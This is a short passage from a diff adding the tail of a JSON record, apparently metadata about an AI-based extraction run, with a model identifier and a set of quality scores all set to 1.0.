+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
